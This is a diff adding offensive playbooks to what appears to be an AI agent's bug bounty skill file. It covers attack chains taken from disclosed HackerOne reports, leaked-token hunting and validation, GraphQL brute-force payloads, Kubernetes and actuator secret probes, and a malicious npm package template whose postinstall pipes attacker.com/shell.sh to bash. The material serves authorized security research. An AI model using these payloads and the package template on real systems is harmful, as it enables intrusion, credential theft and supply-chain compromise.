@@ -1,6 +1,6 @@
 ---
 name: bountyforge
-description: All-round bug bounty skill covering smart contract audits (EVM/Solidity, Move/Aptos, Solana, TRON), web/API security, CI/CD pipeline attacks, LLM/AI security, and professional report generation for HackerOne, Bugcrowd, Intigriti, and Immunefi. Full pipeline — recon, pre-hunt learning from disclosed reports, vulnerability hunting (IDOR, SSRF, XSS, auth bypass, CSRF, race conditions, SQLi, XXE, SSTI, GraphQL, HTTP smuggling, cache poisoning, OAuth, subdomain takeover, cloud misconfig, ATO chains, agentic AI), A→B bug chaining, bypass tables, language-specific grep patterns, CI/CD (GitHub Actions expression injection, untrusted checkout, artifact/cache poisoning, self-hosted runner exploitation), and reporting (7-Question Gate, 4 validation gates, human-tone writing, CVSS 3.1, PoC generation). Includes supervisor triage system and disclosed-report knowledge base. Trigger on "audit", "bug bounty", "check for vulns", "find bugs", "write report", "security review", "check this contract", "find issues", "CVSS", "HackerOne report", "bounty report", "triage findings", "hunt". Always use this skill for any security research or audit task.
+description: All-round bug bounty skill covering smart contract audits (EVM/Solidity, Move/Aptos, Solana, TRON), web/API security, CI/CD pipeline attacks, LLM/AI security, and professional report generation for HackerOne, Bugcrowd, Intigriti, and Immunefi. Full pipeline — recon, pre-hunt learning from disclosed reports, vulnerability hunting (IDOR, SSRF, XSS, auth bypass, CSRF, race conditions, SQLi, XXE, SSTI, GraphQL, HTTP smuggling, cache poisoning, OAuth, subdomain takeover, cloud misconfig, ATO chains, agentic AI), A→B bug chaining (12 proven chains from H100), bypass tables, language-specific grep patterns, CI/CD (GitHub Actions expression injection, untrusted checkout, artifact/cache poisoning, self-hosted runner exploitation), supply chain attacks (npm/Gem/PyPI), infrastructure hunting (Jenkins, Grafana, K8s, Spring actuators), credential leak hunting, program-specific targeting profiles, and reporting (7-Question Gate, 4 validation gates, human-tone writing, CVSS 3.1, PoC generation). Includes supervisor triage system and disclosed-report knowledge base. Trigger on "audit", "bug bounty", "check for vulns", "find bugs", "write report", "security review", "check this contract", "find issues", "CVSS", "HackerOne report", "bounty report", "triage findings", "hunt". Always use this skill for any security research or audit task.
 ---
 
 # BountyForge — Bug Bounty Hunter
@@ -212,6 +212,146 @@ python3 tools/hunt.py --target T --auth-file .private/T-user-b.json
 
 ---
 
+## H100 PROVEN A→B CHAINS (From HackerOne Top 100 Upvoted)
+
+These are not theoretical. Every chain below was reported, triaged, and paid.
+
+### Chain 1: HTTP Smuggling → Session Hijack → Mass ATO
+**Source:** Slack #737140 ($0, 866uv), Zomato #771666, New Relic #498052 ($3K)
+```
+1. Find CL.TE desync on subdomain behind Akamai/Cloudflare
+2. Craft smuggled request that forces victim into 301 redirect
+3. Redirect points to Burp Collaborator / attacker server
+4. Victim's browser follows redirect WITH session cookies attached
+5. Steal d cookie / session token from Collaborator logs
+6. Impersonate victim — full account access
+```
+**Key detail:** Target subdomains with "b" suffix (slackb.com) — often less hardened than main domain.
+
+### Chain 2: Cache Poisoning → Stored XSS on Auth Pages
+**Source:** PayPal #488147 ($18.9K) + #510152 ($20K, 2679uv)
+```
+1. Find unkeyed header (X-Forwarded-Host, X-Original-URL) reflected in response
+2. Poison CDN cache with XSS payload in that header
+3. Cached page served to ANY user visiting paypal.com/signin
+4. CSP bypass via older jQuery library on paypalobjects.com
+5. jQuery selector gadget converts <script> tag to executable code
+6. Session tokens / credentials stolen from login page context
+```
+**Key detail:** Even with CSP, jQuery + 'unsafe-eval' = CSP bypass. Search for older JS libraries in scope domains.
+
+### Chain 3: Email Confirmation Bypass → SSO Takeover → Full Store Compromise
+**Source:** Shopify #791775 ($0, 1913uv) + #796808 ($0, 894uv) + #910300 ($0, 559uv)
+```
+1. Create trial account with your email
+2. Change email to victim's email in profile
+3. Confirmation link sent to YOUR email (not victim's)
+4. Confirm victim's email on your account
+5. Use Shopify SSO — now your account "owns" victim's email
+6. Set master password via SSO for all stores using that email
+7. Full takeover of victim's Shopify stores
+```
+**Key detail:** The fix was incomplete 3 times. Always re-test after patches.
+
+### Chain 4: Leaked GitHub Token → Repo Access → Supply Chain
+**Source:** Shopify #1087489 ($50K, 1544uv), Starbucks #716292, Snapchat #47
+```
+1. Download target's public app (Electron .asar, Android APK, iOS IPA)
+2. Extract .env or config from packaged app
+3. Find GitHub Personal Access Token
+4. Test token: curl -H "Authorization: token TOKEN" https://api.github.com/user
+5. If org member → read/write access to ALL private repos
+6. Plant backdoor in source code → downstream users compromised
+```
+**Key detail:** Always check compiled/packaged apps, not just source repos.
+
+### Chain 5: SSRF → Cloud Metadata → RCE
+**Source:** Shopify #446585 ($11K), Snapchat #530974, Shopify #341876
+```
+1. Find SSRF (file import, image URL fetch, analytics reports)
+2. Access AWS metadata: http://169.254.169.254/latest/meta-data/
+3. Get IAM role credentials from metadata endpoint
+4. Use credentials to access S3, internal APIs, or other cloud services
+5. Pivot to RCE via CI/CD, Lambda, or internal admin panels
+```
+
+### Chain 6: npm/Supply Chain → RCE
+**Source:** PayPal #925585 ($30K, 933uv), LY Corp #1043385 ($11.5K)
+```
+1. Enumerate target's npm dependencies (package.json, lock files)
+2. Find internal package names (scoped @company/* or custom names)
+3. Check if package exists on public npm registry
+4. If not → publish malicious package with same name
+5. Target's CI/CD installs package → arbitrary code execution
+```
+**Key detail:** Also works with Ruby gems, Python packages, Go modules.
+
+### Chain 7: Git Flag Injection → File Overwrite → RCE
+**Source:** GitLab #658013 ($12K, 777uv), #587854 ($12K, 542uv)
+```
+1. Craft malicious git repository with special filenames
+2. Filename contains git flags: --template=/etc/cron.d/backdoor
+3. Target imports the repository
+4. Git processes the flag → overwrites system files
+5. Write crontab, SSH keys, or web shell → RCE
+```
+
+### Chain 8: VPN/Infrastructure 1-Day → Pre-Auth RCE
+**Source:** X/Twitter #591295 ($20.16K, 1239uv) — Orange Tsai
+```
+1. Monitor for CVE patches on VPN appliances (Pulse Secure, FortiGate)
+2. Wait 30 days for targets to patch
+3. Check if target still vulnerable: pulse_check.py target.com
+4. CVE-2019-11510: pre-auth arbitrary file read → extract session DB
+5. Bypass 2FA via "Roaming Session" feature (forge cookies)
+6. SSRF to admin panel (WebVPN → proxy to itself)
+7. Crack manager password hash (weak policy on admin accounts)
+8. Command injection on admin interface → root RCE
+```
+**Key detail:** Monitor vendor advisories. Many orgs take 60-90 days to patch VPNs.
+
+### Chain 9: Kubernetes API Exposed → Container RCE
+**Source:** Snapchat #455645 ($25K, 1185uv)
+```
+1. Find exposed Kubernetes API server (often on non-standard port)
+2. No authentication required
+3. kubectl --server=https://target:6443 get pods
+4. Execute into any running container
+5. Full server access from within container
+```
+
+### Chain 10: GraphQL Missing Auth → Mass PII Exfil
+**Source:** HackerOne #489146 ($0, 1032uv), #792927, #2032716 ($12.5K)
+```
+1. Run GraphQL introspection query
+2. Find user-related types with sensitive fields (email, PII)
+3. Query without authentication or with low-privilege token
+4. Enumerate all users via pagination or node() queries
+5. Extract full user database including private program reports
+```
+
+### Chain 11: Project Import → Private Data Exfil
+**Source:** GitLab #827052 ($20K, 1500uv), #1132378 ($16K), #743953 ($20K)
+```
+1. Create issue with markdown image reference using path traversal
+2. ![a](/uploads/aaaa...aaa/../../../../../../../../../../etc/passwd)
+3. Move issue to another project
+4. UploadsRewriter copies the file without path validation
+5. Arbitrary file read: /etc/passwd, tokens, configs, database.yml
+6. Escalate to RCE by reading SSH keys or database credentials
+```
+
+### Chain 12: SMTP/Email System → Credential Theft
+**Source:** PayPal #739737 ($15.3K, 1408uv)
+```
+1. Trigger security challenge flow on PayPal
+2. Intercept token in the challenge response
+3. Token leaks victim's email AND plaintext password
+4. Direct login with stolen credentials
+```
+
+---
+
 ## TOP 1% HACKER MINDSET
 
 ### Crown Jewel Thinking
@@ -291,6 +431,72 @@ cat /tmp/urls.txt | grep "\.js$" | sort -u > /tmp/jsfiles.txt
 - [ ] GraphQL introspection enabled
 - [ ] Spring actuators (`/actuator/env`, `/actuator/heapdump`)
 - [ ] Firebase open read (`/.json`)
+- [ ] Hardcoded API keys in JS bundles
+- [ ] Credentials in public Git repos (GitHub, GitLab, Bitbucket)
+- [ ] Exposed CI/CD dashboards (Jenkins, CircleCI, Travis CI)
+
+## Credential Leak Hunting (H100 Pattern — 7 reports, $50K+ total)
+
+5 of the Top 100 reports involved leaked credentials in code repos or build artifacts.
+
+### Token Types That Pay
+
+| Token Type | How to Find | Impact |
+|------------|-------------|--------|
+| GitHub Personal Access Token | `grep -r "ghp_\|github_pat_" --include="*.env" --include="*.json"` | Read/write all org repos |
+| npm token | `grep -r "npm_" --include="*.npmrc" --include="*.env"` | Publish to org's npm scope |
+| AWS Access Key | `grep -r "AKIA" --include="*.env" --include="*.py" --include="*.js"` | Full AWS access |
+| Slack webhook | `grep -r "hooks.slack.com" --include="*.env" --include="*.yml"` | Post to any channel |
+| Stripe key | `grep -r "sk_live_\|pk_live_" --include="*.env" --include="*.js"` | Payment processing |
+| Docker Hub token | `grep -r "dckr_pat_" --include="*.env"` | Container registry access |
+| Google API key | `grep -r "AIza" --include="*.env" --include="*.js"` | Various GCP services |
+
+### Where to Find Leaked Tokens
+
+**Public repos:**
+```bash
+# Search target's GitHub org for secrets
+gh api -X GET "search/code?q=org:TARGET+filename:.env" --jq '.items[].repository.full_name'
+gh api -X GET "search/code?q=org:TARGET+AKIA" --jq '.items[].html_url'
+
+# Check for .env in compiled apps
+asar extract app.asar /tmp/app
+grep -r "TOKEN\|SECRET\|KEY\|PASSWORD" /tmp/app/
+```
+
+**Build logs:**
+```bash
+# Travis CI (Superhuman #496937 — $5K)
+curl -s "https://api.travis-ci.org/repos/TARGET/REPO/builds" | jq '.[].config.raw_config'
+# Look for: env.global with secrets, deploy section
+
+# GitHub Actions logs
+gh run list --repo TARGET/REPO --limit 5
+gh run view RUN_ID --repo TARGET/REPO --log | grep -i "token\|secret\|key"
+```
+
+**Docker images:**
+```bash
+# Pull and inspect
+docker pull TARGET/app:latest
+docker run --rm -it TARGET/app:latest env
+docker run --rm -it TARGET/app:latest cat /app/.env
+```
+
+### Token Validation PoC
+```bash
+# GitHub token
+curl -H "Authorization: token ghp_xxxxx" https://api.github.com/user
+# If 200 → valid, check repos_access, org membership
+
+# AWS key
+aws sts get-caller-identity --access-key-id AKIAxxxx --secret-access-key xxxx
+# If valid → enumerate S3 buckets, IAM policies
+
+# npm token
+curl -H "Authorization: Bearer npm_xxxxx" https://registry.npmjs.org/-/whoami
+# If valid → check publish access to org packages
+```
 
 ## Source Code Recon
 ```bash
@@ -634,6 +840,48 @@ SeLeCt * FrOm uSeRs
 - [ ] Batching attack (rate limit bypass): send 100 login attempts in one JSON array
 - [ ] Alias-based brute: send same query with 100 aliases
 
+### GraphQL — H100 Exploited Patterns
+
+**Pattern 1: Missing field-level auth → Mass PII (HackerOne #489146, #792927, #2032716)**
+```graphql
+# Introspection — find sensitive types
+{ __schema { types { name fields { name type { name } } } } }
+
+# Query private user data without auth
+{ node(id: "base64(UserType:123)") { ... on User { email name } } }
+
+# Email enumeration via mutation
+mutation { SaveCollaboratorsMutation(input: {report_id: "1", usernames: ["victim"]}) { user { email } } }
+```
+
+**Pattern 2: GraphQL batching → Rate limit bypass**
+```json
+[
+  {"query": "mutation { login(email:\"a@test.com\",password:\"pass1\") { token } }"},
+  {"query": "mutation { login(email:\"a@test.com\",password:\"pass2\") { token } }"},
+  ... (1000 copies)
+]
+```
+
+**Pattern 3: Alias-based brute force**
+```graphql
+query {
+  a1: login(email: "user@test.com", password: "pass1") { token }
+  a2: login(email: "user@test.com", password: "pass2") { token }
+  a3: login(email: "user@test.com", password: "pass3") { token }
+  # ... 100 aliases in single query
+}
+```
+
+**Pattern 4: Report data leak via GraphQL (HackerOne platform itself)**
+```graphql
+# Leak private program details
+{ PolicyPageAssetGroupsIndex(id: "gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/123") { ... } }
+
+# Leak report attributes
+{ report(id: 123) { title vulnerability_information created_at } }
+```
+
 ## Cache Poisoning / Web Cache Deception
 - [ ] Test `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL` — unkeyed headers reflected in response
 - [ ] Parameter cloaking (`?param=value;poison=xss`)
@@ -659,6 +907,60 @@ SMUGGLED
 ```
 Frontend reads Content-Length: 13 → sends all. Backend reads Transfer-Encoding → sees chunk "0" = end → "SMUGGLED" left in buffer → next user's request poisoned.
 
+### HTTP Smuggling → Mass Session Hijack (H100 Pattern)
+
+All 4 smuggling reports in the Top 100 used the same chain: desync → redirect → cookie theft.
+
+**Target selection:**
+- Subdomains with "b" suffix: slackb.com, admin-official.line.me (often less hardened)
+- Endpoints behind CDN/reverse proxy (Akamai, Cloudflare, nginx)
+- Login/authentication endpoints that issue session cookies on redirect
+
+**The PoC pattern (Slack #737140):**
+```
+1. CL.TE desync on slackb.com
+2. Smuggled request forces victim into GET https:// HTTP/1.1
+3. Backend responds with 301 redirect to https://
+4. Victim's browser follows redirect WITH Slack d cookie
+5. Redirect target = Burp Collaborator
+6. Collect session cookies from Collaborator
+7. Impersonate any Slack user
+```
+
+**Testing checklist:**
+- [ ] Send request with both Content-Length and Transfer-Encoding headers
+- [ ] Use Burp Repeater "Send group in sequence" to test desync
+- [ ] Monitor Burp Collaborator for incoming requests from other IPs
+- [ ] Check if response timing differs between smuggled vs normal requests
+- [ ] Test on subdomains, not just main domain
+
+### Cache Poisoning → Stored XSS on Sensitive Pages (H100 Pattern)
+
+PayPal's two reports (#488147 + #510152) proved this chain pays $18-20K.
+
+**Attack flow:**
+```
+1. Identify unkeyed header reflected in response
+   - X-Forwarded-Host, X-Original-URL, X-Rewrite-URL
+   - Test: send request with header=evil.com, check if response changes
+2. Check if response is cached (Cache-Control, CDN headers, X-Cache)
+3. Poison cache with XSS payload in the unkeyed header
+4. Wait for victim to visit the same URL → served poisoned cached copy
+5. XSS executes in victim's browser on the sensitive page
+```
+
+**CSP Bypass patterns (from PayPal):**
+- Find older JS libraries on scope domains (jQuery < 3.0, Bootstrap < 3.4.1)
+- jQuery selector gadget: `<script>` → jQuery converts to DOM element → executes
+- 'unsafe-eval' in CSP + jQuery = direct script execution
+- Search: `grep -r "jquery" --include="*.js" | sort` on scope domains
+
+**High-value targets for cache poisoning:**
+- Login pages (paypal.com/signin) — tokens, credentials in context
+- Dashboard/admin pages — session tokens, user data
+- Payment/checkout pages — financial data
+- Settings/profile pages — PII, API keys
+
 ## Android / Mobile Hunting
 - [ ] Certificate pinning bypass (Frida/objection)
 - [ ] Exported activities/receivers (AndroidManifest.xml)
@@ -666,6 +968,35 @@ Frontend reads Content-Length: 13 → sends all. Backend reads Transfer-Encoding
 - [ ] Shared preferences / SQLite in cleartext
 - [ ] WebView JavaScript bridge
 - [ ] Mobile API often uses older/different API version than web
+
+### Console / Desktop Client Hunting (H100 Pattern — Valve, PlayStation)
+
+**4 reports in Top 100 targeted game/desktop clients for RCE:**
+
+**Valve #470520: RCE via buffer overflow in Server Info**
+- Game clients parse server info responses
+- Crafted server info packet → buffer overflow → arbitrary code execution
+- No auth required — victim just joins a game server
+
+**PlayStation #873614: Websites Can Run Arbitrary Code on PS Now**
+- Browser-based app has access to system-level APIs
+- Malicious website → JavaScript execution → system command access
+- Attack vector: shared links, in-game web views
+
+**PlayStation #826026: Use-After-Free in IPV6_2292PKTOPTIONS**
+- Kernel-level vulnerability in network stack
+- Malformed IPv6 packet → UAF → arbitrary kernel read/write
+- Fully pre-auth, no user interaction beyond network
+
+**Testing checklist for client-side:**
+- [ ] Download client app (APK, IPA, .exe, .dmg)
+- [ ] Extract and analyze: `strings`, `nm`, `otool -L`
+- [ ] Check for hardcoded endpoints, API keys, debug flags
+- [ ] Fuzz custom protocol parsers (server info, chat, matchmaking)
+- [ ] Test deep links / URI schemes for injection
+- [ ] Check if app exposes local server/API without auth
+- [ ] Test WebView JavaScript bridges
+- [ ] Look for deserialization of untrusted data (config files, server responses)
 
 ## SSTI — Server-Side Template Injection
 
@@ -771,6 +1102,40 @@ Can you link an OAuth account from a different email to an existing account?
 ### Path 7: Session Fixation
 GET /login → note Set-Cookie session=XYZ → Log in → does session ID change? If not = fixation.
 
+### Path 8: Email Confirmation Bypass → SSO Takeover (H100 — Shopify #791775, #796808, #910300)
+
+This exact pattern was reported 3 times against Shopify. The fix was incomplete each time.
+
+**Attack flow:**
+```
+1. Create trial account with your-controlled email (attacker@test.com)
+2. Go to profile → change email to victim@company.com
+3. Shopify sends confirmation link to YOUR email (not victim's)
+   - Bug: confirmation goes to the "current" email, not the "new" email
+4. Click confirmation link → your account now has victim's email confirmed
+5. Use Shopify SSO: your account = victim's email across all stores
+6. Set master password via SSO → take over all stores using that email
+```
+
+**How to test this on any platform:**
+- [ ] Create account with email A
+- [ ] Change email to email B (victim)
+- [ ] Where does confirmation link go? A or B?
+- [ ] If it goes to A → email confirmation bypass
+- [ ] Check if SSO/OAuth links accounts by email
+- [ ] Can you set password for accounts that used OAuth-only login?
+
+### Path 9: OAuth Account Linking Abuse (H100 — Uber #202781)
+
+**Attack flow:**
+```
+1. Attacker initiates OAuth flow with victim's email
+2. OAuth provider sends code to victim (if they have access)
+3. OR: Attacker already has OAuth account linked to victim's email
+4. Exchange code for token → link to attacker's primary account
+5. Now attacker has victim's OAuth data on their account
+```
+
 ## Cloud / Infra Misconfigs
 
 ```bash
@@ -787,6 +1152,50 @@ curl -s "https://TARGET-APP.firebaseio.com/.json"
 
 # Exposed admin panels
 # /jenkins /grafana /kibana /swagger-ui /phpMyAdmin /.env /actuator/env
+```
+
+### Infrastructure Hunting — H100 Pattern ($10-25K per finding)
+
+Snapchat's 3 infrastructure reports averaged $13.3K each.
+
+**Exposed CI/CD (Snapchat #231460 — $15K, #313457 — $0)**
+```bash
+# Jenkins
+curl -s "https://jenkins.target.com/api/json" | jq '.jobs[].name'
+curl -s "https://jenkins.target.com/script" # Script console
+
+# CircleCI
+curl -s "https://circleci.com/api/v1.1/project/gh/TARGET/REPO" | jq '.[0].build_num'
+
+# GitLab CI
+curl -s "https://gitlab.target.com/api/v4/projects" | jq '.[].ci_config_path'
+
+# Check for open build systems
+for sub in jenkins ci build buildkite travis drone; do
+  curl -s -o /dev/null -w "$sub: %{http_code}\n" "https://$sub.target.com/"
+done
+```
+
+**Exposed Grafana (Snapchat #663628 — $10K)**
+```bash
+curl -s "https://grafana.target.com/api/search" | jq '.[].title'
+curl -s "https://grafana.target.com/api/dashboards/db/home" | jq '.dashboard.panels[].targets'
+# Grafana dashboards often contain: DB queries, internal URLs, API keys, credentials
+```
+
+**Exposed Kubernetes API (Snapchat #455645 — $25K)**
+```bash
+curl -sk "https://target.com:6443/api/v1/namespaces"
+curl -sk "https://target.com:6443/api/v1/pods"
+curl -sk "https://target.com:6443/api/v1/secrets"
+# If 200 → you're in. No auth = full cluster access.
+```
+
+**Exposed Spring Actuators (LY Corp #170532 — $18K)**
+```bash
+curl -s "https://target.com/actuator/env" | jq '.propertySources[].properties | to_entries[] | select(.key | test("password|secret|key"))'
+curl -s "https://target.com/actuator/heapdump" -o heapdump
+# Analyze heapdump for secrets: jhat heapdump or Eclipse MAT
 ```
 
 ## CI/CD Pipeline — GitHub Actions Security
@@ -890,6 +1299,51 @@ Impostor commit → pinned action hijack → all downstream repos affected
 OIDC token theft → cloud metadata → S3/GCS read → customer data
 Self-hosted runner → container escape → internal network pivot
 ```
+
+## Supply Chain Hunting (H100 — PayPal #925585 $30K, LY Corp #1043385 $11.5K)
+
+npm/Gem/PyPI supply chain attacks paid $11-30K in the Top 100.
+
+### How to Find Vulnerable Targets
+
+```bash
+# 1. Find target's package dependencies
+# Check package.json, Gemfile, requirements.txt, go.mod in public repos
+gh api -X GET "search/code?q=org:TARGET+filename:package.json" --jq '.items[].repository.full_name' | sort -u
+
+# 2. Extract package names
+cat package.json | jq -r '.dependencies | keys[]' 2>/dev/null
+cat package.json | jq -r '.devDependencies | keys[]' 2>/dev/null
+
+# 3. Check if packages exist on public registry
+for pkg in $(cat package.json | jq -r '.dependencies | keys[]'); do
+  status=$(curl -s -o /dev/null -w "%{http_code}" "https://registry.npmjs.org/$pkg")
+  echo "$pkg: $status"
+done
+
+# 4. If 404 → package name is available → you can register it
+npm publish  # with malicious postinstall script
+```
+
+### Malicious Package Template
+
+```json
+// package.json
+{
+  "name": "target-internal-package-name",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl https://attacker.com/shell.sh | bash"
+  }
+}
+```
+
+### Also Check:
+- **Ruby gems:** `gem search TARGET --remote` — check for unpublished internal gem names
+- **Python packages:** `pip search TARGET` or check requirements.txt
+- **Go modules:** Check go.mod for private module paths
+- **Docker base images:** Check if target publishes to Docker Hub with stale base images
+- **GitHub Actions:** Check if target uses unpinned actions (mutable tags → impostor commits)
 
 ---
 
@@ -1093,6 +1547,91 @@ Below 60 → LEAD only (no fix, no PoC).
 
 Missing CSP/HSTS/security headers, missing SPF/DKIM/DMARC, GraphQL introspection alone, banner/version disclosure without working CVE exploit, clickjacking on non-sensitive pages, tabnabbing, CSV injection, CORS wildcard without credential exfil PoC, logout CSRF, self-XSS, open redirect alone, OAuth client_secret in mobile app, SSRF DNS-ping only, host header injection alone, no rate limit on non-critical forms, session not invalidated on logout, concurrent sessions, internal IP disclosure, mixed content, SSL weak ciphers, missing HttpOnly/Secure cookie flags alone, broken external links, pre-account takeover, autocomplete on password fields.
 
+---
+
+## HIGH-VALUE TARGET PROFILES (From H100 Analysis)
+
+Patterns extracted from 100 highest-upvoted HackerOne reports. Use for target selection and prioritization.
+
+### Tier 1: Highest ROI Targets
+
+**GitLab (12 reports, $134K total bounty)**
+- Biggest attack surface of any program — code hosting, CI/CD, wiki, imports
+- Top bug classes: RCE (4), File Read/Write (3), SSRF, Data Leak, SSTI
+- Key attack surfaces:
+  - **Project import** — SSRF, path traversal, file read via UploadsRewriter
+  - **Markdown/Wiki rendering** — Kramdown RCE, stored XSS, template injection
+  - **File uploads** — path traversal, webshell, ExifTool RCE
+  - **CI/CD pipelines** — runner token exposure, pipeline job execution
+  - **Merge requests** — code review features bypass file restrictions
+- Hunting strategy: Focus on import/export features, check for path traversal in any file copy/move operation
+
+**Shopify (8 reports, $50K total bounty)**
+- Top bug classes: Privilege Escalation (4), SSRF, OAuth, Credential Leak, SSTI
+- Key attack surfaces:
+  - **Email confirmation flow** — bypass leads to full store takeover via SSO
+  - **Electron apps** — .env files in packaged apps leak GitHub tokens
+  - **Third-party apps** — OAuth misconfigurations in app integrations
+  - **Stocky app** — OAuth token theft via redirect_uri manipulation
+- Hunting strategy: Download all Shopify apps, extract .env from asar files, check OAuth flows
+
+**PayPal (6 reports, $93.9K total bounty — highest $/report)**
+- Top bug classes: XSS (2), RCE, Token Leak, DoS, IDOR
+- Key attack surfaces:
+  - **Login page** — cache poisoning → stored XSS on paypal.com/signin
+  - **Security challenge flow** — token leaks email + plaintext password
+  - **npm packages** — internal packages published to public registry
+  - **Business management API** — IDOR on user management endpoints
+- Hunting strategy: Focus on auth flows, cache poisoning, supply chain
+
+**Snapchat (7 reports, $65K total bounty)**
+- Top bug classes: Infrastructure Misconfig (3), RCE, Auth Bypass, SSRF
+- Key attack surfaces:
+  - **Internal tools** — Jenkins, Grafana, CI dashboards exposed
+  - **Kubernetes** — API server exposed to internet, no auth
+  - **Content management** — delete any user's spotlight content
+  - **GraphQL** — information disclosure via introspection
+- Hunting strategy: Scan for exposed admin panels, K8s APIs, internal dashboards
+
+### Tier 2: Consistent Payouts
+
+**Valve (5 reports, $40K)**
+- Game client RCE (buffer overflow, XSS in chat), SQLi, payment tampering
+- Attack surface: Steam client, game servers, report generation API
+- Key: Client-side parsing of untrusted data (server info, chat messages)
+
+**X / xAI (4 reports, $20.16K)**
+- Pre-auth RCE via VPN (Pulse Secure 1-day), auth bypass, CRLF injection
+- Attack surface: VPN infrastructure, Digits API, web properties
+- Key: Monitor VPN vendor patches, test immediately after disclosure
+
+**Uber (3 reports, $40.4K)**
+- Info disclosure (bonjour.uber.com RPC), OAuth chain, leaked certificates
+- Attack surface: Internal microservices, mobile APIs, OAuth flows
+- Key: Check old/mobile API versions, leaked certs in git history
+
+### Tier 3: Quick Wins
+
+**Snapchat infrastructure** — Jenkins, Grafana, K8s API = instant $10-25K
+**Starbucks** — SQLi on web apps + leaked credentials in repos = consistent findings
+**Razer** — SQLi + command injection on gaming web portals
+**Mail.ru** — SQLi, file upload, memory disclosure
+**LY Corp (LINE)** — HTTP smuggling, OAuth misconfig, privilege escalation
+
+### Cross-Target Patterns
+
+| Attack Vector | Programs Hit | Avg Bounty |
+|---------------|-------------|------------|
+| Leaked tokens in code/apps | Shopify, Starbucks, Snapchat, Superhuman | $10-50K |
+| HTTP smuggling → session hijack | Slack, LY Corp, Zomato, New Relic | $0-6.5K |
+| Infrastructure misconfig (Jenkins/K8s) | Snapchat | $10-25K |
+| GraphQL missing auth | HackerOne | $0-12.5K |
+| Email confirmation bypass | Shopify | $0-15K |
+| Cache poisoning → XSS | PayPal | $18-20K |
+| File upload → RCE | Semrush, Starbucks, GitLab | $0-20K |
+| npm/supply chain | PayPal, LY Corp | $11-30K |
+| SQLi (classic) | Starbucks, Razer, Valve, Mail.ru, GSA | $0-25K |
+
 ## Conditionally Valid With Chain
 
 | Low Finding | + Chain | = Valid Bug |
@@ -1123,6 +1662,8 @@ Missing CSP/HSTS/security headers, missing SPF/DKIM/DMARC, GraphQL introspection
 ## RESOURCES
 
 - [HackerOne Hacktivity](https://hackerone.com/hacktivity) — Disclosed reports
+- [HackerOne Top 100 Upvoted](https://reddelexc.github.io/hackerone-reports/#tops_100/TOP100UPVOTED.md) — Highest upvoted reports by bug class and program
+- [HackerOne Top 100 Paid](https://reddelexc.github.io/hackerone-reports/#tops_100/TOP100PAID.md) — Highest paying reports
 - [PortSwigger Web Academy](https://portswigger.net/web-security) — Free vuln labs
 - [HackTricks](https://book.hacktricks.xyz) — Attack technique reference
 - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — Payload reference
